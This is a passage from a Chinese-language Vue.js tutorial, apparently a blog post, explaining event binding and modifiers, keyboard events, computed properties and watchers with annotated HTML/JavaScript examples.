class="string">&quot;fun($event,3)&quot;</span>&gt;</span>点击触发事件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                name:<span class="string">&quot;ccy&quot;</span>,</span></span><br><span class="line"><span class="javascript">                pwd:<span class="string">&quot;123456&quot;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">fun</span>(<span class="params">event,number</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(event)</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(number)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">总结：</span></span><br><span class="line"><span class="comment">事件的基本使用：</span></span><br><span class="line"><span class="comment">1.使用v-on:xxx或@xxx绑定事件，其中xxx是事件名</span></span><br><span class="line"><span class="comment">2.事件的回调需要配置在methods对象中，最终会在vm上</span></span><br><span class="line"><span class="comment">3.methods中配置的函数，不要用箭头函数！否则this就不是vm了,那就是window了</span></span><br><span class="line"><span class="comment">4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm或组件实例对象</span></span><br><span class="line"><span class="comment">5.@click=&quot;demo&quot;和@click=&quot;demo($event,a)&quot;效果一致，但后者可以传参</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p><img src="image-20220417203448225.png" alt=""></p><h3 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符"></a>事件修饰符</h3><blockquote><p>Vue中的事件修饰符</p></blockquote><ol><li>prevent：阻止默认事件（常用）preventDefault()</li><li>stop：阻止事件冒泡（常用）stopPropagation()</li><li>once：事件只触发一次（常用）</li><li>capture：使用事件的捕获模式</li><li>self：只有event.target是当前操作的元素时才触发事件，操作其他元素是不会触发该事件的</li><li>passive：事件的默认行为<strong>立即执行</strong>，无需等待事件回调执行完毕</li><li>Number:强制转换成数字 类型</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> @<span class="attr">click</span>=<span class="string">&quot;fun($event,3)&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 阻止冒泡和默认跳转行为,事件修饰符可以连接写 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;htttp://www.baidu.com&quot;</span> @<span class="attr">click.stop.prevent</span>=<span class="string">&quot;fun($event,3)&quot;</span>&gt;</span>点击触发事件<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：事件修饰符可以连接写</p><h3 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h3><blockquote><p>语法：@键盘事件.修饰键==”函数名“</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1.Vue中常用的按键别名：</span></span><br><span class="line"><span class="comment">回车=&gt;enter</span></span><br><span class="line"><span class="comment">删除=&gt;delete(捕获“删除”和退格”键)</span></span><br><span class="line"><span class="comment">退出=&gt;esc</span></span><br><span class="line"><span class="comment">空格=&gt;space</span></span><br><span class="line"><span class="comment">换行=&gt;tab(必须配合@keydown使用)</span></span><br><span class="line"><span class="comment">上=&gt;up</span></span><br><span class="line"><span class="comment">下=&gt;down</span></span><br><span class="line"><span class="comment">左=&gt;1eft</span></span><br><span class="line"><span class="comment">右=&gt;right</span></span><br><span class="line"><span class="comment">keyup事件：先用键盘输入一些值，再按下对应事件的键盘修饰键，然后松开按键就可以触发该事件</span></span><br><span class="line"><span class="comment">keydown事件：按下就可以触发，不用等到松开按键。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名且都是小写）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3.系统修饰键（用法特殊）：ctr1、alt、shift、meta</span></span><br><span class="line"><span class="comment">(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，该事件才会被触发，但是想要按其他键是固定的，可以这么写</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 按下ctrl+y才会触发该事件，按ctrl+其他键就不行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> @<span class="attr">keyup.ctrl.y</span>=<span class="string">&quot;fun&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">(2).配合keydown使用：正常触发事件，按下就可以触发，不用等到松开按键。</span><br><span class="line"></span><br><span class="line">4.也可以使用keyCode去指定具体的按键（不推荐）</span><br><span class="line"></span><br><span class="line">5.Vue.config.keyCodes.自定义键名=键码，可以去定制按键别名（不建议使用）</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 按回车会触发该事件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> @<span class="attr">keyup.enter</span>=<span class="string">&quot;fun&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                name:<span class="string">&quot;ccy&quot;</span>,</span></span><br><span class="line"><span class="javascript">                pwd:<span class="string">&quot;123456&quot;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">fun</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 该函数没有传递参数，默认会有事件（event）,可以用一个参数来接收</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(e)</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(e.target.value)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h1><h3 id="计算属性-computed"><a href="#计算属性-computed" class="headerlink" title="计算属性 computed"></a>计算属性 computed</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">计算属性：computed</span></span><br><span class="line"><span class="comment">1.定义：要用的属性不存在，要通过己有属性(vm管理的属性)计算得来。</span></span><br><span class="line"><span class="comment">2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter.</span></span><br><span class="line"><span class="comment">3.get函数什么时候执行？</span></span><br><span class="line"><span class="comment">(1).初次读取时会执行一次。</span></span><br><span class="line"><span class="comment">(2).当依赖的数据发生改变时会被再次调用。</span></span><br><span class="line"><span class="comment">4.优势：与methods实现相比，内部有缓存机制（复用,再一次去调用时，会走缓存机制，不会重新执行get()），效率更高，调试方便。</span></span><br><span class="line"><span class="comment">5.备注：</span></span><br><span class="line"><span class="comment">1.计算属性最终会出现在vm上，直接读取使用即可，错误示范（函数名.get()）。</span></span><br><span class="line"><span class="comment">2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生变化</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    性：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    全名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                firstName:<span class="string">&quot;陈&quot;</span>,</span></span><br><span class="line"><span class="javascript">                lastName:<span class="string">&quot;小胖&quot;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">// 方法</span></span></span><br><span class="line">        methods:&#123;&#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//计算属性</span></span></span><br><span class="line">        computed:&#123;</span><br><span class="line">            fullName:&#123;</span><br><span class="line"><span class="javascript">                <span class="comment">// get()什么时候？当有人调用fullName函数时会调用，且返回值就作为fullName的值</span></span></span><br><span class="line"><span class="javascript">                <span class="comment">// set()什么时候被调用？1.初始读取fullName时。2.所依赖的数据发生变化时</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> <span class="built_in">this</span>.firstName + <span class="string">&quot;-&quot;</span> + <span class="built_in">this</span>.lastName</span></span><br><span class="line">                &#125;,</span><br><span class="line"><span class="javascript">                <span class="comment">// set()什么时候被调用？当fullName的值被修改时</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">set</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> arr = value.split(<span class="string">&quot;-&quot;</span>)</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.firstName = arr[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.lastName = arr[<span class="number">1</span>]</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="image-20220418111318407.png" alt=""></p><h3 id="计算属性简写"><a href="#计算属性简写" class="headerlink" title="计算属性简写"></a>计算属性简写</h3><p>计算属性简写的前提：写get()而不写set()的情况下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    性：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    全名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                firstName:<span class="string">&quot;陈&quot;</span>,</span></span><br><span class="line"><span class="javascript">                lastName:<span class="string">&quot;小胖&quot;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">// 方法</span></span></span><br><span class="line">        methods:&#123;&#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//计算属性简写</span></span></span><br><span class="line">        computed:&#123;      </span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">fullName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> <span class="built_in">this</span>.firstName + <span class="string">&quot;-&quot;</span> + <span class="built_in">this</span>.lastName</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="image-20220418111321720.png" alt=""></p><h1 id="监视-侦听属性"><a href="#监视-侦听属性" class="headerlink" title="监视/侦听属性"></a>监视/侦听属性</h1><h3 id="监视属性watch"><a href="#监视属性watch" class="headerlink" title="监视属性watch"></a>监视属性watch</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">监视属性watch:</span></span><br><span class="line"><span class="comment">1.当被监视的属性变化时，回调函数自动调用，进行相关操作</span></span><br><span class="line"><span class="comment">2,监视的属性必须存在，才能进行监视！！</span></span><br><span class="line"><span class="comment">3.监视的两种写法：</span></span><br><span class="line"><span class="comment">(1).new Vue时传入watch配置</span></span><br><span class="line"><span class="comment">(2).通过vm.$watch监视</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                firstName:<span class="string">&quot;陈&quot;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="comment">// 第一种写法</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// watch:&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     firstName:&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//   // immediate：true表示立即执行handler()函数，不用修改firstName就直接调用handler函数</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         immediate:true,</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         handler(newValue,oldValue)&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//             console.log(newValue,oldValue)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第二种写法</span></span></span><br><span class="line"><span class="javascript">    vm.$watch(<span class="string">&quot;firstName&quot;</span>,&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// immediate：true表示立即执行handler()函数，不用修改firstName就直接调用handler函数</span></span></span><br><span class="line"><span class="javascript">        immediate:<span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(newValue,oldValue)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="深度监视"><a href="#深度监视" class="headerlink" title="深度监视"></a>深度监视</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">深度监视：</span></span><br><span class="line"><span class="comment">(1).Vue中的watch默认不监测对象内部值的改变（一层）</span></span><br><span class="line"><span class="comment">(2).配置deep:true可以监测对象内部值改变（多层）</span></span><br><span class="line"><span class="comment">备注：</span></span><br><span class="line"><span class="comment">(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！</span></span><br><span class="line"><span class="comment">(2).使用watch时根据数据的具体结构，决定是否采用深度监视。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    姓名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;info.name&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;info.pwd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                firstName:<span class="string">&quot;陈&quot;</span>,</span></span><br><span class="line">                info:&#123;</span><br><span class="line"><span class="javascript">                    name:<span class="string">&quot;admin&quot;</span>,</span></span><br><span class="line">                    pwd:123</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        watch:&#123;</span><br><span class="line"><span class="javascript">            <span class="comment">// 监视多级结构中所有属性的变化（例如：info对象中的所有属性）</span></span></span><br><span class="line">            info:&#123;</span><br><span class="line"><span class="javascript">                <span class="comment">// 想要监视到info对象中所有属性的变化，就需要添加deep:true,不添加的话，watch就监视不到info对象中所有属性的变化</span></span></span><br><span class="line"><span class="javascript">                deep:<span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">handler</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(<span class="string">&quot;通过deep就可以监听到了info对象中的属性变化&quot;</span>)</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="监视属性的简写"><a href="#监视属性的简写" class="headerlink" title="监视属性的简写"></a>监视属性的简写</h3><p>简写属性的前提：不写immediate和deep，就写handler函数的情况下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                firstName:<span class="string">&quot;陈&quot;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        watch:&#123;</span><br><span class="line"><span class="javascript">            <span class="comment">// 完整写法</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//  firstName:&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//      // immediate：true表示立即执行handler()函数，不用修改firstName就直接调用handler函数</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//      immediate:true,</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//      handler(newValue,oldValue)&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//          console.log(newValue,oldValue)</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//      &#125;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//  &#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">// 简写属性</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">firstName</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(newValue,oldValue)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第二种写法的简写</span></span></span><br><span class="line"><span class="javascript">    <span 